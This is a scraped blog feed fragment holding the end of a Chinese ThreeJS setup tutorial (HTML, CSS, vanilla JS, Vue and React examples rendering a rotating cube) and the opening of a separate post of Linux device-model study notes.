  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/svg+xml"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/vite.svg"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vite App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"css/style.css"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"src/main-mk.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>注意：我们引入了CSS样式表来确保Canvas元素正确显示。</p>
<h3 data-id="heading-5">4. CSS样式配置</h3>
<p>在<code>public/css/style.css</code>中设置基本样式：</p>
<pre><code class="hljs language-css" lang="css">*{
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-tag">canvas</span>{
  <span class="hljs-attribute">display</span>: block;
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
}
</code></pre>
<p>这些样式确保Canvas元素占据整个浏览器窗口且没有默认的边距。</p>
<h3 data-id="heading-6">5. 核心JavaScript代码</h3>
<p>这是ThreeJS应用的核心代码（在<code>src/main-mk.js</code>中）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;

<span class="hljs-comment">// 创建场景</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
<span class="hljs-comment">// 修改场景背景色</span>
scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0xeeeeee</span>);

<span class="hljs-comment">// 创建透视相机</span>
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(
  <span class="hljs-number">45</span>, <span class="hljs-comment">// 视角</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-comment">// 宽高比</span>
  <span class="hljs-number">0.1</span>, <span class="hljs-comment">// 近平面</span>
)

<span class="hljs-comment">// 创建WebGL渲染器</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// 创建几何体 - 盒子几何体</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
<span class="hljs-comment">// 创建材质 - 基础网格材质</span>
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span> });
<span class="hljs-comment">// 创建网格对象</span>
<span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(cube);

<span class="hljs-comment">// 设置相机位置</span>
camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;

<span class="hljs-comment">// 动画循环函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  
  <span class="hljs-comment">// 让立方体持续旋转</span>
  cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> += <span class="hljs-number">0.01</span>;
  cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.01</span>;
  
  <span class="hljs-comment">// 渲染场景</span>
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
}

<span class="hljs-comment">// 启动动画循环</span>
<span class="hljs-title function_">animate</span>()
</code></pre>
<p>这段代码包含了ThreeJS应用的三个核心组件：</p>
<ol>
<li><strong>场景（Scene）</strong>：所有3D对象的容器</li>
<li><strong>相机（Camera）</strong>：定义观察者视角</li>
<li><strong>渲染器（Renderer）</strong>：负责将场景和相机组合起来渲染为图像</li>
</ol>
<h3 data-id="heading-7">6. 项目的package.json配置</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"01-startapp"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.3.9"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"three"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^0.153.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">第二部分：与Vue框架集成</h2>
<h3 data-id="heading-9">1. Vue项目配置</h3>
<p>当将ThreeJS与Vue集成时，需要在Vue项目中安装额外的依赖：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"threejsvue"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"three"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^0.153.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.47"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@vitejs/plugin-vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.1.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.3.9"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-10">2. 在Vue组件中使用ThreeJS</h3>
<p>在Vue的<code>App.vue</code>文件中可以直接集成ThreeJS代码：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
// 导入threejs
import * as THREE from "three";

// 创建场景
const scene = new THREE.Scene();

// 创建相机
const camera = new THREE.PerspectiveCamera(
  45, // 视角
  window.innerWidth / window.innerHeight, // 宽高比
  0.1, // 近平面
  1000 // 远平面
);

// 创建渲染器
const renderer = new THREE.WebGLRenderer();
renderer.setSize(window.innerWidth, window.innerHeight);
document.body.appendChild(renderer.domElement);

// 创建几何体
const geometry = new THREE.BoxGeometry(1, 1, 1);
// 创建材质
const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
// 创建网格
const cube = new THREE.Mesh(geometry, material);

// 将网格添加到场景中
scene.add(cube);

// 设置相机位置
camera.position.z = 5;
camera.lookAt(0, 0, 0);

// 渲染函数
function animate() {
  requestAnimationFrame(animate);
  // 旋转
  cube.rotation.x += 0.01;
  cube.rotation.y += 0.01;
  // 渲染
  renderer.render(scene, camera);
}
animate();
&lt;/script&gt;

&lt;template&gt;
  &lt;div&gt;&lt;/div&gt;
&lt;/template&gt;

&lt;style&gt;
* {
  margin: 0;
  padding: 0;
}

canvas {
  display: block;
  position: fixed;
  left: 0;
  top: 0;
  width: 100vw;
  height: 100vh;
}
&lt;/style&gt;
</code></pre>
<h2 data-id="heading-11">第三部分：与React框架集成</h2>
<h3 data-id="heading-12">1. React项目配置</h3>
<p>当将ThreeJS与React集成时，需要在React项目中安装相应的依赖：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"react3d"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint src --ext js,jsx --report-unused-disable-directives --max-warnings 0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"three"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^0.153.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.0.37"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@types/react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.0.11"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@vitejs/plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.38.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.32.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react-hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.6.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react-refresh"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^0.3.4"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.3.9"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-13">2. 在React组件中使用ThreeJS</h3>
<p>在React的<code>App.jsx</code>文件中可以这样集成ThreeJS：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState,useEffect ,<span class="hljs-title class_">Component</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> reactLogo <span class="hljs-keyword">from</span> <span class="hljs-string">'./assets/react.svg'</span>
<span class="hljs-keyword">import</span> viteLogo <span class="hljs-keyword">from</span> <span class="hljs-string">'/vite.svg'</span>
<span class="hljs-comment">// 导入threejs</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"three"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'./App.css'</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span>{
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>){
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  }
  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"/>){
    <span class="hljs-comment">// 创建场景</span>
    <span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();

    <span class="hljs-comment">// 创建相机</span>
    <span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(
      <span class="hljs-number">45</span>, <span class="hljs-comment">// 视角</span>
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-comment">// 宽高比</span>
      <span class="hljs-number">0.1</span>, <span class="hljs-comment">// 近平面</span>
      <span class="hljs-number">1000</span> <span class="hljs-comment">// 远平面</span>
    );

    <span class="hljs-comment">// 创建渲染器</span>
    <span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
    renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

    <span class="hljs-comment">// 创建几何体</span>
    <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// 创建材质</span>
    <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span> });
    <span class="hljs-comment">// 创建网格</span>
    <span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);

    <span class="hljs-comment">// 将网格添加到场景中</span>
    scene.<span class="hljs-title function_">add</span>(cube);

    <span class="hljs-comment">// 设置相机位置</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;
    camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// 渲染函数</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">requestAnimationFrame</span>(animate);
      <span class="hljs-comment">// 旋转</span>
      cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> += <span class="hljs-number">0.01</span>;
      cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.01</span>;
      <span class="hljs-comment">// 渲染</span>
      renderer.<span class="hljs-title function_">render</span>(scene, camera);
    }
    <span class="hljs-title function_">animate</span>();
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>
</code></pre>
<h2 data-id="heading-14">总结</h2>
<p>通过以上步骤，我们已经成功搭建了ThreeJS开发环境，并创建了独立运行的ThreeJS应用以及与Vue和React框架集成的应用。ThreeJS的三个核心概念——场景、相机和渲染器是构建任何3D应用的基础，理解它们的作用和关系对于后续学习非常重要。</p>
<p>无论是在纯JavaScript项目还是在现代前端框架（Vue、React）中，ThreeJS的基本使用方法都是一致的，只是集成方式略有不同。掌握了这些基础知识后，您可以进一步探索ThreeJS的更多功能，如光照、材质、纹理等高级特性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux 设备模型学习笔记（1）]]></title>    <link>https://juejin.cn/post/7595028805158469642</link>    <guid>https://juejin.cn/post/7595028805158469642</guid>    <pubDate>2026-01-14T09:55:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595028805158469642" data-draft-id="7595028805158420490" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux 设备模型学习笔记（1）"/> <meta itemprop="keywords" content="面试,嵌入式"/> <meta itemprop="datePublished" content="2026-01-14T09:55:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xlp666hub"/> <meta itemprop="url" content="https://juejin.cn/user/2965810860569131"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux 设备模型学习笔记（1）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2965810860569131/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xlp666hub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:55:44.000Z" title="Wed Jan 14 2026 09:55:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Linux 设备模型学习笔记（1）</h2>
<h2 data-id="heading-1">前言</h2>
<p>最近在学习 Linux 驱动开发，从简单的字符设备再到平台总线，深刻体会到了 Linux 内核的博大精深，期间阅读了不少前辈们写的文章，资料等等，再结合我自己的一些思考和理解，整理成这篇笔记。</p>
<h2 data-id="heading-2">1. 为什么需要设备模型？</h2>
<p>在 Linux 发展的早期，驱动开发可以算得上是非常简单粗暴，写驱动就是申请设备号，操作硬件等等。Linux 是支持所有不同功能的硬件设备的，这是它的优点，但这也导致 Linux 内核中有相当大一部分代码都是设备驱动相关的，并且随着后来嵌入式系统的爆发（特别是ARM SoC），这种情况愈发严重。早期那种简单粗暴的驱动开发方式已经不再适用了，因为它会带来下面几个问题：</p>
<p>第一，<strong>代码的低复用导致的代码规模爆发式增长</strong>。在早期的那种驱动开发方式中，硬件信息与驱动代码是强耦合的，也就是我们常说的硬编码，这种方式的特点是驱动代码里面不仅包含了<strong>控制硬件的方法</strong>，还包含了<strong>硬件设备的详细信息</strong>。比如，我们需要控制板子上的一个 LED ，在这个板子上 LED 在 GPIO 3 上面，而另一块板子上 LED 在 GPIO 4 上面，那么相同逻辑的 led 驱动代码由于硬件信息的不同，就要写两遍。<strong>硬件信息的硬编码导致驱动代码无法跨板子复用</strong>，这就是代码规模爆发式增长的原因，且其中大部分代码都是重复的。</p>
